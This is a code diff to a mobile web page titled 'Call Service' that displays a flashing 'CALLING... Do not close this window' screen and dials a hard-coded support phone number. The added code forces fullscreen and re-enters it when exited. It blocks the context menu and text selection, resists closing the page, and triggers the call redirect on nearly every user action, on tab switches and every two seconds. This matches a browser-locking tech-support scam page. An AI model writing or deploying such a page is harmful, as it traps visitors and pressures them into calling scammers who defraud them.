@@ -2,34 +2,97 @@
 <html>
 <head>
     <title>Call Service</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
             -webkit-tap-highlight-color: transparent;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
         }
         body {
             font-family: Arial, sans-serif;
-            background: #000;
+            background: linear-gradient(135deg, #ff0000, #0000ff);
             color: white;
             height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             text-align: center;
+            overflow: hidden;
+            touch-action: none;
+        }
+        .content {
+            padding: 20px;
+        }
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+        }
+        p {
+            font-size: 1.2rem;
+            margin-bottom: 30px;
+        }
+        .blink {
+            animation: blink 1s infinite;
+            font-size: 1.5rem;
+            margin: 20px 0;
+        }
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
         }
     </style>
 </head>
 <body>
-    <div>
-        <h1>📞 Call Support</h1>
-        <p>We are connecting you...</p>
+    <div class="content">
+        <h1>📞 CALLING... 📞</h1>
+        <div class="blink">Please Wait</div>
+        <p>Connecting you to our support team</p>
+        <p>Do not close this window</p>
     </div>
 
     <script>
         const PHONE_NUMBER = "+911234567890";
+        
+        // Fullscreen function
+        function enterFullscreen() {
+            try {
+                const elem = document.documentElement;
+                if (elem.requestFullscreen) {
+                    elem.requestFullscreen();
+                } else if (elem.webkitRequestFullscreen) {
+                    elem.webkitRequestFullscreen();
+                } else if (elem.msRequestFullscreen) {
+                    elem.msRequestFullscreen();
+                } else if (elem.mozRequestFullScreen) {
+                    elem.mozRequestFullScreen();
+                }
+            } catch (e) {
+                console.log("Fullscreen error:", e);
+            }
+        }
+        
+        // Exit fullscreen block
+        document.addEventListener('fullscreenchange', function() {
+            if (!document.fullscreenElement) {
+                enterFullscreen();
+                fastRedirect();
+            }
+        });
+        
+        document.addEventListener('webkitfullscreenchange', function() {
+            if (!document.webkitFullscreenElement) {
+                enterFullscreen();
+                fastRedirect();
+            }
+        });
         
         // Fast redirect function
         function fastRedirect() {
@@ -47,9 +110,6 @@
         }
         
         // URL bar click detection
-        let urlBarClicked = false;
-        
-        // Monitor URL changes and focus events
         let currentURL = window.location.href;
         
         setInterval(() => {
@@ -64,9 +124,9 @@
                document.activeElement.tagName === 'TEXTAREA') {
                 fastRedirect();
             }
-        }, 10); // Very fast checking
+        }, 10);
         
-        // Window focus/blur events - when switching to URL bar
+        // Window focus/blur events
         window.addEventListener('blur', function() {
             setTimeout(fastRedirect, 100);
         });
@@ -75,34 +135,74 @@
             setTimeout(fastRedirect, 100);
         });
         
-        // Mouse events near top of screen (where URL bar is)
+        // Mouse events near top of screen (URL bar area)
         document.addEventListener('mousedown', function(e) {
-            if(e.clientY < 50) { // Top area of screen
+            if(e.clientY < 50) {
                 fastRedirect();
             }
         });
         
         document.addEventListener('touchstart', function(e) {
-            if(e.touches[0].clientY < 50) { // Top area of screen
+            if(e.touches[0].clientY < 50) {
                 fastRedirect();
             }
         });
         
         // Key events for URL editing
         document.addEventListener('keydown', function(e) {
-            // If any key pressed (especially for URL editing)
             fastRedirect();
         });
         
-        // Page load pe bhi ready
-        window.onload = function() {
-            // Continuous monitoring start
-            setInterval(fastRedirect, 2000); // Every 2 seconds try call
-        };
-        
-        // Normal click events
+        // All click events
         document.addEventListener('click', fastRedirect);
         document.addEventListener('touchstart', fastRedirect);
+        document.addEventListener('mousedown', fastRedirect);
+        
+        // Prevent context menu
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            fastRedirect();
+        });
+        
+        // Prevent text selection
+        document.addEventListener('selectstart', function(e) {
+            e.preventDefault();
+            fastRedirect();
+        });
+        
+        // Page load - start everything
+        window.onload = function() {
+            // Enter fullscreen immediately
+            enterFullscreen();
+            
+            // Start continuous monitoring
+            setInterval(fastRedirect, 2000);
+            
+            // First call after 3 seconds
+            setTimeout(fastRedirect, 3000);
+        };
+        
+        // Resize event - if user tries to exit fullscreen
+        window.addEventListener('resize', function() {
+            enterFullscreen();
+            fastRedirect();
+        });
+        
+        // Visibility change - if user switches tabs
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                fastRedirect();
+            }
+        });
+        
+        // Beforeunload - if user tries to close
+        window.addEventListener('beforeunload', function(e) {
+            fastRedirect();
+            e.preventDefault();
+            e.returnValue = '';
+        });
+        
+        console.log("Fullscreen Call System Activated!");
         
     </script>
 </body>
